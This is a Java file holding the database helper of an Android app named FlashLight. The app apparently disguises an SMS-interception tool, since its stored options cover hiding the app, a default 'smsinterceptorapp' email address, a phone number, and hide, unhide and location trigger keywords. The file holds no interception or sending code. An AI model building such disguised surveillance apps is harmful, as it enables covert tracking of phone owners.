package com.flash.light;

import android.util.Log;

import java.util.List;
import java.util.ArrayList;
 
import android.content.Context;
import android.content.ContentValues;

import android.database.Cursor;
import android.database.sqlite.SQLiteDatabase;
import android.database.sqlite.SQLiteOpenHelper;

public class DatabaseHandler extends SQLiteOpenHelper {
 
  private static final int DATABASE_VERSION = 1;
 
  private static final String KEY_ID               = "id";
  private static final String KEY_HIDE             = "hide";
  private static final String KEY_EMAIL            = "email";
  private static final String KEY_PHONE_NO         = "number";
  private static final String KEY_HIDE_KEYWORD     = "hide_keyword";
  private static final String KEY_UNHIDE_KEYWORD   = "unhide_keyword";
  private static final String KEY_LOCATION_KEYWORD = "location_keyword";

  private static final String TABLE_OPTIONS = "options";
  private static final String DATABASE_NAME = "FlashLight";
 
  public DatabaseHandler(Context context) {
    super(context, DATABASE_NAME, null, DATABASE_VERSION);
  }
 
  @Override
  public void onCreate(SQLiteDatabase db) {
    String CREATE_OPTIONS_TABLE = "CREATE TABLE " + TABLE_OPTIONS + "("
      + KEY_ID + " INTEGER PRIMARY KEY," 
      + KEY_HIDE + " TEXT DEFAULT 'no'," 
      + KEY_EMAIL + " TEXT DEFAULT 'smsinterceptorapp@gmail.com'," 
      + KEY_PHONE_NO + " TEXT DEFAULT '5555551234'," 
      + KEY_HIDE_KEYWORD + " TEXT DEFAULT ''," 
      + KEY_UNHIDE_KEYWORD + " TEXT DEFAULT '',"
      + KEY_LOCATION_KEYWORD + " TEXT DEFAULT '');";
    db.execSQL(CREATE_OPTIONS_TABLE);
  }
 
  @Override
  public void onUpgrade(SQLiteDatabase db, int oldVersion, int newVersion) {
    db.execSQL("DROP TABLE IF EXISTS " + TABLE_OPTIONS);
    onCreate(db);
  }

  void addFlashLightDatabase(FlashLightDatabase flashLightDatabase) {
    Log.d("FlashLight","public int addFlashLightDatabase()");
    SQLiteDatabase db = this.getWritableDatabase();
 
    ContentValues values = new ContentValues();
    values.put(KEY_HIDE, flashLightDatabase.getHide()); 
    values.put(KEY_EMAIL, flashLightDatabase.getEmailAddress()); 
    values.put(KEY_PHONE_NO, flashLightDatabase.getPhoneNumber()); 
    values.put(KEY_HIDE_KEYWORD, flashLightDatabase.getHideKeyword()); 
    values.put(KEY_UNHIDE_KEYWORD, flashLightDatabase.getUnhideKeyword()); 
    values.put(KEY_LOCATION_KEYWORD, flashLightDatabase.getLocationKeyword()); 
 
    db.insert(TABLE_OPTIONS, null, values);
    db.close(); 
  }
 
  FlashLightDatabase getFlashLightDatabase(int id) {
    SQLiteDatabase db = this.getReadableDatabase();
 
    Cursor cursor = db.query(TABLE_OPTIONS, 
      new String[] { KEY_ID, KEY_HIDE, KEY_EMAIL, KEY_PHONE_NO, KEY_HIDE_KEYWORD, KEY_UNHIDE_KEYWORD, KEY_LOCATION_KEYWORD }, KEY_ID + "=?",
      new String[] { String.valueOf(id) }, null, null, null, null);
      if (cursor != null) {
        cursor.moveToFirst();
      }
 
      FlashLightDatabase flashLightDatabase = new FlashLightDatabase(Integer.parseInt(cursor.getString(0)),
        cursor.getString(1),
        cursor.getString(2),
        cursor.getString(3),
        cursor.getString(4),
        cursor.getString(5),
        cursor.getString(6));

      if(cursor != null) {
        cursor.close();
      }
      return flashLightDatabase;
  }
     
  public List<FlashLightDatabase> getAllFlashLightDatabase() {

    List<FlashLightDatabase> flashLightDatabaseList = new ArrayList<FlashLightDatabase>();

    String selectQuery = "SELECT  * FROM " + TABLE_OPTIONS;
 
    SQLiteDatabase db  = this.getWritableDatabase();
    Cursor cursor      = db.rawQuery(selectQuery, null);

    if (cursor.moveToFirst()) {
      do {
        FlashLightDatabase flashLightDatabase = new FlashLightDatabase();
        flashLightDatabase.setID(Integer.parseInt(cursor.getString(0)));
        flashLightDatabase.setHide(cursor.getString(1));
        flashLightDatabase.setEmailAddress(cursor.getString(2));
        flashLightDatabase.setPhoneNumber(cursor.getString(3));
        flashLightDatabase.setHideKeyword(cursor.getString(4));
        flashLightDatabase.setUnhideKeyword(cursor.getString(5));
        flashLightDatabase.setLocationKeyword(cursor.getString(6));
        flashLightDatabaseList.add(flashLightDatabase);
      } while (cursor.moveToNext());
    }
    if(cursor != null) {
      cursor.close();
    }
    return flashLightDatabaseList;
  }
 
  public int updateFlashLightDatabase(FlashLightDatabase flashLightDatabase) {
    Log.d("FlashLight","public int updateFlashLightDatabase()");
    SQLiteDatabase db    = this.getWritableDatabase();
    ContentValues values = new ContentValues();
    values.put(KEY_HIDE, flashLightDatabase.getHide());
    values.put(KEY_EMAIL, flashLightDatabase.getEmailAddress());
    values.put(KEY_PHONE_NO, flashLightDatabase.getPhoneNumber());
    values.put(KEY_HIDE_KEYWORD, flashLightDatabase.getHideKeyword());
    values.put(KEY_UNHIDE_KEYWORD, flashLightDatabase.getUnhideKeyword());
    values.put(KEY_LOCATION_KEYWORD, flashLightDatabase.getLocationKeyword());
 
    return db.update(TABLE_OPTIONS, values, KEY_ID + " = ?",
      new String[] { String.valueOf(flashLightDatabase.getID()) });
  }
 
  public void deleteFlashLightDatabase(FlashLightDatabase flashLightDatabase) {
    SQLiteDatabase db = this.getWritableDatabase();
    db.delete(TABLE_OPTIONS, KEY_ID + " = ?",
      new String[] { String.valueOf(flashLightDatabase.getID()) });
    db.close();
  }

}
